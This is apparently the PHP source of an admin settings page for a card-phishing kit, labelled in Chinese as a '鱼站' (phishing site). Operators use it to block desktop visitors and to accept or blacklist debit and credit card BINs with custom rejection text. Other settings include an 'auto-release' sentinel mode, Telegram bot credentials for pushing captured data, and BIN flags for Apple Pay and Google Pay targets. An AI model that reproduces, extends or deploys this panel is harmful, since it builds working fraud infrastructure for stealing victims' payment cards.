<?php
date_default_timezone_set('Asia/Tokyo');
$time = date('Hi');


//echo $time;
$theme_mode = 'day';
if (($time >= "0600") && ($time <= "1200")) {
  $admin_time_zone_msg = "Good Morning";
  $theme_mode = 'day';
} elseif (($time >= "1201") && ($time <= "1600")) {
  $admin_time_zone_msg = "Good Afternoon";
  $theme_mode = 'day';
} elseif (($time >= "1601") && ($time <= "2100")) {
  $admin_time_zone_msg = "Good Evening";
  $theme_mode = 'day';
} elseif (($time >= "2101") && ($time <= "2400")) {
  $admin_time_zone_msg = "Good Night";
  $theme_mode = 'day'; //night
} else {
  $admin_time_zone_msg = "Why aren't you asleep?  Are you programming?<br>";
}

require_once 'config.php';

if($_SESSION["loggedin"]['user_group']!="admin"){
  echo "You have not permission to access this page";exit;
}

if (isset($_POST['form_submission'])) {

  $auto_refresh = @$_POST['auto_refresh'];
  if (!empty($auto_refresh)) {
    $auto_refresh = 'on';
  } else {
    $auto_refresh = "off";
  }

  $proxy_access = @$_POST['proxy_access'];
  if (!empty($proxy_access)) {
    $proxy_access = 'on';
  } else {
    $proxy_access = "off";
  }

  $pc_access = @$_POST['pc_access'];
  if (!empty($pc_access)) {
    $pc_access = 'on';
  } else {
    $pc_access = "off";
  }

  $sql = "UPDATE `dashboard` SET value='" . $auto_refresh . "'  WHERE meta_key='auto_refresh'";
  $result = mysqli_query($conn, $sql);

  $sql = "UPDATE `dashboard` SET value='" . $proxy_access . "'  WHERE meta_key='proxy_access'";
  $result = mysqli_query($conn, $sql);

  $sql = "UPDATE `dashboard` SET value='" . $pc_access . "'  WHERE meta_key='pc_access'";
  $result = mysqli_query($conn, $sql);
}

$row = [];
$sql = "SELECT * FROM dashboard where meta_key='auto_refresh'";
if ($result = mysqli_query($conn, $sql)) {
  $row = $result->fetch_row();
  $get_auto_refresh = $row[3];
}
$row = [];
$sql = "SELECT * FROM dashboard where meta_key='proxy_access'";
if ($result = mysqli_query($conn, $sql)) {
  $row = $result->fetch_row();
  $get_proxy_access = $row[3];
}
$row = [];
$sql = "SELECT * FROM dashboard where meta_key='pc_access'";
if ($result = mysqli_query($conn, $sql)) {
  $row = $result->fetch_row();
  $get_pc_access = $row[3];
}
$row = [];
$sql = "SELECT * FROM dashboard where meta_key='login_limit_count'";
if ($result = mysqli_query($conn, $sql)) {
  $row = $result->fetch_row();
  $login_limit_count = $row[3];
}
$row = [];
$sql = "SELECT * FROM dashboard where meta_key='allow_debit_card'";
if ($result = mysqli_query($conn, $sql)) {
  $row = $result->fetch_row();
  $allow_debit_card = $row[3];
}
$row = [];
$sql = "SELECT * FROM dashboard where meta_key='allow_credit_card'";
if ($result = mysqli_query($conn, $sql)) {
  $row = $result->fetch_row();
  $allow_credit_card = $row[3];
}
$row = [];
$sql = "SELECT * FROM dashboard where meta_key='restricted_numbers'";
if ($result = mysqli_query($conn, $sql)) {
  $row = $result->fetch_row();
  $restricted_numbers = $row[3];
}
$row = [];
$sql = "SELECT * FROM dashboard where meta_key='restricted_numbers_error'";
if ($result = mysqli_query($conn, $sql)) {
  $row = $result->fetch_row();
  $restricted_numbers_error = $row[3];
}

$row = [];
$sql = "SELECT * FROM dashboard where meta_key='telegram_token'";
if ($result = mysqli_query($conn, $sql)) {
  $row = $result->fetch_row();
  $telegram_token = $row[3];
}
$row = [];
$sql = "SELECT * FROM dashboard where meta_key='telegram_chatid'";
if ($result = mysqli_query($conn, $sql)) {
  $row = $result->fetch_row();
  $telegram_chatid = $row[3];
}

$iphone="";
$row = [];
$sql = "SELECT * FROM dashboard where meta_key='iphone'";
if ($result = mysqli_query($conn, $sql)) {
  $row = $result->fetch_row();
  if(empty($row)){
       $insert = "INSERT INTO dashboard (meta_key,value,post_id) VALUES ('iphone', '','')";
      mysqli_query($conn, $insert);
  }
  $iphone = $row[3];
}


$android="";
$row = [];
$sql = "SELECT * FROM dashboard where meta_key='android'";
if ($result = mysqli_query($conn, $sql)) {
  $row = $result->fetch_row();

  if(empty($row)){
    $insert = "INSERT INTO dashboard (meta_key,value,post_id) VALUES ('android', '','')";
      mysqli_query($conn, $insert);
  }
  $android = $row[3];
}

$web="";
$row = [];
$sql = "SELECT * FROM dashboard where meta_key='web'";
if ($result = mysqli_query($conn, $sql)) {
  $row = $result->fetch_row();

  if(empty($row)){
       $insert = "INSERT INTO dashboard (meta_key,value,post_id) VALUES ('web', '','')";
       mysqli_query($conn, $insert);
  }
  $web = $row[3];
}

$telegram_bot_username="";
$row = [];
$sql = "SELECT * FROM dashboard where meta_key='telegram_bot_username'";
if ($result = mysqli_query($conn, $sql)) {
  $row = $result->fetch_row();
  $telegram_bot_username = $row[3];
}


$row = [];
$sql = "SELECT * FROM dashboard where meta_key='page4_redirect'";
if ($result = mysqli_query($conn, $sql)) {
  $row = $result->fetch_row();
  $page4_redirect = $row[3];
}

$row = [];
$sql = "SELECT * FROM dashboard where meta_key='page4_redirect_time'";
if ($result = mysqli_query($conn, $sql)) {
  $row = $result->fetch_row();
  $page4_redirect_time = $row[3];
}


// Check if the user is logged in, if not then redirect him to login page
if (!isset($_SESSION["loggedin"])) {
  header("location: /admin/login.php");
  exit;
}
?>

<!DOCTYPE html>

<html lang="en" class="light-style layout-menu-fixed" dir="ltr" data-theme="theme-default" data-assets-path="./assets/" data-template="vertical-menu-template-free">

<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, minimum-scale=1.0, maximum-scale=1.0" />

  <title>设置</title>

  <meta name="description" content="" />

  <!-- Favicon -->
  <link rel="icon" type="image/x-icon" href="./assets/img/favicon/favicon.ico" />

  <!-- Fonts -->
  <link rel="preconnect" href="https://fonts.googleapis.com" />
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
  <link href="https://fonts.googleapis.com/css2?family=Public+Sans:ital,wght@0,300;0,400;0,500;0,600;0,700;1,300;1,400;1,500;1,600;1,700&display=swap" rel="stylesheet" />

  <!-- Icons. Uncomment required icon fonts -->
  <link rel="stylesheet" href="./assets/vendor/fonts/boxicons.css" />

  <!-- Core CSS -->
  <link rel="stylesheet" href="./assets/vendor/css/core.css" class="template-customizer-core-css" />
  <link rel="stylesheet" href="./assets/vendor/css/theme-default.css" class="template-customizer-theme-css" />
  <link rel="stylesheet" href="./assets/css/demo.css" />

  <!-- Vendors CSS -->
  <link rel="stylesheet" href="./assets/vendor/libs/perfect-scrollbar/perfect-scrollbar.css" />

  <!-- Page CSS -->
  <?php if ($theme_mode == 'night') { ?>
    <link rel="stylesheet" href="./assets/css/core-dark.css" />
    <link rel="stylesheet" href="./assets/css/theme-default-dark.css" />
  <?php } ?>

  <!-- Helpers -->
  <script src="./assets/vendor/js/helpers.js"></script>

  <!--! Template customizer & Theme config files MUST be included after core stylesheets and helpers.js in the <head> section -->
  <!--? Config:  Mandatory theme config file contain global vars & default theme options, Set your preferred theme option in this file.  -->
  <script src="./assets/js/config.js"></script>

  <link rel="stylesheet" href="./assets/css/custom.css" />
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.4/jquery.min.js"></script>
  <script src="./assets/js/custom.js"></script>
  <style type="text/css">
    .caption{
      font-size: 18px;
      padding:10px;
      font-weight: bold;
    }
  </style>

  <?php include("dashboard_header.php"); ?>



</head>

<body>
  <!-- Layout wrapper -->
  <div class="layout-wrapper layout-content-navbar">
    <div class="layout-container">
      <!-- Menu -->

      <?php include("side_menu.php"); ?>
      <!-- / Menu -->

      <!-- Layout container -->
      <div class="layout-page">
        <!-- Content wrapper -->
        <div class="content-wrapper">
          <!-- Content -->

          <div class="container-xxl flex-grow-1 container-p-y">
            <!-- Layout Demo -->
            <div class="content-wrapper">
              <div id="message"></div>
              <h4 class="fw-bold py-3 mb-4"><span class="text-muted fw-light"> </span> 鱼站/设置</h4>

              <div class="col-xl-12">
                <div class="card mb-4">
                  <h5 class="card-header">设置</h5>
            
            <div class="card-body">



            <form method="POST" action="">



                  <div class="row form-row">

                    <div class="col-sm-6">

                      <div class="form-check form-switch mb-4">
                        <input class="form-check-input db_update_chk" name="pc_access" type="checkbox" id="pc_access" <?php echo (@$get_pc_access == 'on') ? 'checked' : '' ?>>
                        <label class="form-check-label" for="pc_access">禁止pc访问</label>
                      </div>
                      <div class="form-check form-switch mb-4">
                        <input class="form-check-input db_update_chk" name="allow_debit_card" type="checkbox" id="allow_debit_card" <?php echo (@$allow_debit_card == 'on') ? 'checked' : '' ?>>
                        <label class="form-check-label" for="allow_debit_card">允许借记卡</label>
                      </div>

                  
            
                      <div class="form-check form-switch">
                        <label >允许使用信用卡</label>
                        <input class="form-check-input db_update_chk" name="allow_credit_card" type="checkbox" id="allow_credit_card" <?php echo (@$allow_credit_card == 'on') ? 'checked' : '' ?>>
                        
                      </div>
                         
                      <br>  
                      <br>  
                      <div class="caption">哨兵模式</div>   
                        <div class="form-check mb-2">
                          <input class="form-check-input db_update_chk" name="page4_redirect" type="checkbox" id="page4_redirect" <?php echo (@$page4_redirect == 'on') ? 'checked' : '' ?>>
                          <label class="form-check-label" for="page4_redirect">自动放行</label>
                        </div>
                

                      <div class="col-auto col-sm-12">
                          <div class="form-check mb-2">
                          <label for="page4_redirect_time">自动放行时间</label>
                          <input class="form-control db_update" name="page4_redirect_time" type="number" id="page4_redirect_time" value="<?php echo (@$page4_redirect_time) ?>">
                          </div>
                      </div>

                      <div class="caption">仪表盘管理员在线人数限制</div>   
                      <div class="col-auto col-sm-12">
                        <div class="form-check mb-2">
                          <label >管理员登录限制数量</label>
                          <input class="form-control mb-2 db_update" name="login_limit_count" type="number" id="login_limit_count" value="<?php echo (@$login_limit_count) ?>">
                        </div>
                      </div>

                      <div class="caption">拉黑卡头</div>   

                      <div class="col-auto col-sm-12">
                        <div class="form-check mb-2">
                          <label for="restricted_numbers">限制卡号</label>
                          <input class="form-control mb-2 db_update" name="restricted_numbers" type="textbox" id="restricted_numbers" value="<?php echo (@$restricted_numbers) ?>" placeholder="默认必须填写一个卡头.使用 , 这个符号隔开数字添加多个卡头">
                        </div>
                      </div>

                      

                      <div class="col-auto col-sm-12">
                        <div class="form-check mb-6">
                          <label>限制卡号文案:</label>
                          <input class="form-control mb-6 db_update" name="restricted_numbers_error" type="textbox" id="restricted_numbers_error" value="<?php echo (@$restricted_numbers_error) ?>">
                        </div>
                      </div>

                      <br>
                      <br>
                      
                     

                      

                  </div>

                  <div class="col-sm-6">

                     <div class="caption">TG机器人推送</div>  
                      <div class="col-auto col-sm-12">
                          <div class="form-check mb-2">
                            <label>Telegram API</label>
                            <input class="form-control mb-2 db_update" name="telegram_token" type="textbox" id="telegram_token" value="<?php echo (@$telegram_token) ?>" placeholder="输入你的TG机器人token">
                          </div>
                      </div>

                      <div class="col-auto col-sm-12">
                          <div class="form-check mb-2">

                            <label>Telegram id</label>
                            <input class="form-control mb-2 db_update" name="telegram_chatid" type="textbox" id="telegram_chatid" value="<?php echo (@$telegram_chatid) ?>" placeholder="输入接收推送通知的账户的id">
                        </div>
                      </div>

                      <div class="col-auto col-sm-12">
                          <div class="form-check mb-2">
                          <label for="restricted_numbers">TG机器人用户名</label>
                          <input class="form-control mb-2 db_update" name="telegram_bot_username" type="textbox" id="telegram_bot_username" value="<?php echo (@$telegram_bot_username) ?>" placeholder="输入您的机器人用户名">
                          </div>
                      </div>



                    <div class="caption">指定卡头提醒</div>  

                      <div class="col-auto col-sm-12">
                          <div class="form-check mb-2" >
                            <img src="./assets/img/iphone.png" width="40" style="margin-bottom: 10px;margin-top: 5px;">
                            <label>Apple Pay 卡提示</label>
                            <input class="form-control mb-2 db_update" name="iphone" type="textbox" id="iphone" value="<?php echo (@$iphone) ?>" placeholder="在此输入的卡头将会在操作栏出现苹果图标提示">
                          </div>
                      </div>

                      <div class="col-auto col-sm-12">
                          <div class="form-check mb-2">
                            <img src="./assets/img/android.png" width="40" style="margin-bottom: 10px;margin-top: 5px;">
                            <label>Google Pay 卡提示</label>
                            <input class="form-control mb-2 db_update" name="android" type="textbox" id="android" value="<?php echo (@$android) ?>" placeholder="在此输入的卡头将会在操作栏出现安卓图标提示">
                          </div>
                      </div>

                      <div class="col-auto col-sm-12">
                          <div class="form-check mb-2">
                            <img src="./assets/img/web.png" width="40" style="margin-bottom: 10px;margin-top: 5px;">
                            <label>提示 通道特定卡提示</label>
                            <input class="form-control mb-2 db_update" name="web" type="textbox" id="web" value="<?php echo (@$web) ?>" placeholder="在此输入的卡头将会在操作栏出现网页图标提示">
                          </div>
                      </div>
                   
                  </div>

                  <div class="col-sm-12">

                        <input name="form_submission" type="hidden" value="submitted">
                        <button type="button" value="submit" class="btn btn-primary">Save</button>
                      </div>

                  </div>


            </form>
            </div>

                </div>
              </div>


            </div>
            <!--/ Layout Demo -->
          </div>
          <!-- / Content -->

          <!-- Footer -->
          <footer class="content-footer footer bg-footer-theme">
            <div class="container-xxl d-flex flex-wrap justify-content-between py-2 flex-md-row flex-column">
              <div class="mb-2 mb-md-0">
                ©
                <script>
                  document.write(new Date().getFullYear());
                </script>
                , made with ❤️

              </div>
            </div>
          </footer>
          <!-- / Footer -->

          <div class="content-backdrop fade"></div>
        </div>
        <!-- Content wrapper -->
      </div>
      <!-- / Layout page -->
    </div>

    <!-- Overlay -->
    <div class="layout-overlay layout-menu-toggle"></div>
  </div>
  <!-- / Layout wrapper -->


  <?php include("dashboard_fotter.php"); ?>
  <!-- Core JS -->
  <!-- build:js assets/vendor/js/core.js -->
  <script src="./assets/vendor/libs/jquery/jquery.js"></script>
  <script src="./assets/vendor/libs/popper/popper.js"></script>
  <script src="./assets/vendor/js/bootstrap.js"></script>
  <script src="./assets/vendor/libs/perfect-scrollbar/perfect-scrollbar.js"></script>

  <script src="./assets/vendor/js/menu.js"></script>
  <!-- endbuild -->

  <!-- Vendors JS -->

  <!-- Main JS -->
  <script src="./assets/js/main.js"></script>

  <!-- Page JS -->

  <!-- Place this tag in your head or just before your close body tag. -->
  <script async defer src="https://buttons.github.io/buttons.js"></script>

  <link rel="stylesheet" type="text/css" href="DataTables/datatables.min.css" />
  <script type="text/javascript" src="DataTables/datatables.min.js"></script>

  <script>
    $(document).ready(function() {
      // Setup - add a text input to each footer cell
      /* $('#example tfoot th').each(function () {
           var title = $(this).text();
           $(this).html('<input type="text" placeholder="Search ' + title + '" />');
       }); */

      // DataTable
      var table = $('#example').DataTable({
        initComplete: function() {
          // Apply the search
          this.api()
            .columns()
            .every(function() {
              var that = this;

              $('input', this.footer()).on('keyup change clear', function() {
                if (that.search() !== this.value) {
                  that.search(this.value).draw();
                }
              });
            });
        },
      });

      $('.db_update').blur(function(e) {
        e.preventDefault();
        var meta_key = $(this).attr('id');
        var value = $(this).val();
        console.log('meta key ' + meta_key);
        $.ajax({
          type: 'post',
          url: 'dashboard_functions.php',
          data: {
            'meta_key': meta_key,
            'value': value,
            'action': 'dashboard_update'
          },
          success: function(data) {
            if (data == 1) {
              /*$("#message").html(
                "<span style='color: green;font-size: 18px;text-align: left;width: 100%;padding: 10px 0 0 0;'>Config updated Successfully<span>"
              );*/


               let toast = {
                    title: "Success!",
                    message: "Config updated Successfully?",
                    status: 1,
                    timeout: 5000
                }
                Toast.create(toast);

              /*setTimeout(function() {
                $("#message").html('');
              }, 3000);*/
              return true;
            } else {
              $("#message").html(
                "<span style='color: red;font-size: 18px;text-align: left;width: 100%;padding: 10px 0 0 0;'>Something is wrong with limit update .please contact to administrator.<span>"
              );

              return false;
            }
          }
        });
      });
      $('.db_update_chk').change(function(e) {
        e.preventDefault();
        var meta_key = $(this).attr('id');
        var value = $(this).val();
        if ($(this).is(':checked'))
          value = 'on';
        else
          value = 'off';
        //console.log('meta key ' + meta_key);
        $.ajax({
          type: 'post',
          url: 'dashboard_functions.php',
          data: {
            'meta_key': meta_key,
            'value': value,
            'action': 'dashboard_update'
          },
          success: function(data) {
            if (data == 1) {
              /*$("#message").html(
                "<span style='color: green;font-size: 18px;text-align: left;width: 100%;padding: 10px 0 0 0;'>Config updated Successfully<span>"
              );*/

                let toast = {
                    title: "Success!",
                    message: "Config updated Successfully?",
                    status: 1,
                    timeout: 5000
                }
                Toast.create(toast);

              /*setTimeout(function() {
                $("#message").html('');
              }, 3000);*/
              return true;
            } else {
              $("#message").html(
                "<span style='color: red;font-size: 18px;text-align: left;width: 100%;padding: 10px 0 0 0;'>Something is wrong with limit update .please contact to administrator.<span>"
              );

              return false;
            }
          }
        });
      });
      // $("#login_limit_count").blur(function(e) {
      //   e.preventDefault();
      //   var login_limit_count = $(this).val();
      //   $.ajax({
      //     type: 'post',
      //     url: 'dashboard_functions.php',
      //     data: {
      //       'meta_key': 'login_limit_count',
      //       'value': login_limit_count,
      //       'action': 'dashboard_update'
      //     },
      //     success: function(data) {
      //       if (data == 1) {
      //         $("#message").html(
      //           "<span style='color: green;font-size: 18px;text-align: left;width: 100%;padding: 10px 0 0 0;'>Limit updated Successfully<span>"
      //         );
      //         setTimeout(function() {
      //           $("#message").html('');
      //         }, 3000);
      //         return true;
      //       } else {
      //         $("#message").html(
      //           "<span style='color: red;font-size: 18px;text-align: left;width: 100%;padding: 10px 0 0 0;'>Something is wrong with limit update .please contact to administrator.<span>"
      //         );

      //         return false;
      //       }
      //     }
      //   });
      // });
      // $("#allow_debit_card").change(function(e) {
      //   e.preventDefault();
      //   var allow_debit_card = $(this).val();
      //   if ($('#allow_debit_card').is(':checked'))
      //     allow_debit_card = 'on';
      //   else
      //     allow_debit_card = 'off';


      //   $.ajax({
      //     type: 'post',
      //     url: 'dashboard_functions.php',
      //     data: {
      //       'meta_key': 'allow_debit_card',
      //       'value': allow_debit_card,
      //       'action': 'dashboard_update'
      //     },
      //     success: function(data) {
      //       if (data == 1) {
      //         $("#message").html(
      //           "<span style='color: green;font-size: 18px;text-align: left;width: 100%;padding: 10px 0 0 0;'>Debit card settings udpated successfully<span>"
      //         );
      //         setTimeout(function() {
      //           $("#message").html('');
      //         }, 3000);
      //         return true;
      //       } else {
      //         $("#message").html(
      //           "<span style='color: red;font-size: 18px;text-align: left;width: 100%;padding: 10px 0 0 0;'>Something is wrong with limit update .please contact to administrator.<span>"
      //         );

      //         return false;
      //       }
      //     }
      //   });
      // });
      // $("#allow_credit_card").change(function(e) {
      //   e.preventDefault();
      //   var allow_credit_card = $(this).val();
      //   if ($('#allow_credit_card').is(':checked'))
      //     allow_credit_card = 'on';
      //   else
      //     allow_credit_card = 'off';


      //   $.ajax({
      //     type: 'post',
      //     url: 'dashboard_functions.php',
      //     data: {
      //       'meta_key': 'allow_credit_card',
      //       'value': allow_credit_card,
      //       'action': 'dashboard_update'
      //     },
      //     success: function(data) {
      //       if (data == 1) {
      //         $("#message").html(
      //           "<span style='color: green;font-size: 18px;text-align: left;width: 100%;padding: 10px 0 0 0;'>Credit card settings udpated successfully<span>"
      //         );
      //         setTimeout(function() {
      //           $("#message").html('');
      //         }, 3000);
      //         return true;
      //       } else {
      //         $("#message").html(
      //           "<span style='color: red;font-size: 18px;text-align: left;width: 100%;padding: 10px 0 0 0;'>Something is wrong with limit update .please contact to administrator.<span>"
      //         );

      //         return false;
      //       }
      //     }
      //   });
      // });

    });
  </script>

<!-- <script type="text/javascript">
  // Getting Started


    let toast = {
        title: "Voila!",
        message: "How easy was that?",
        status: 3,
        timeout: 5000
    }
    Toast.create(toast);

</script> -->


</body>

</html>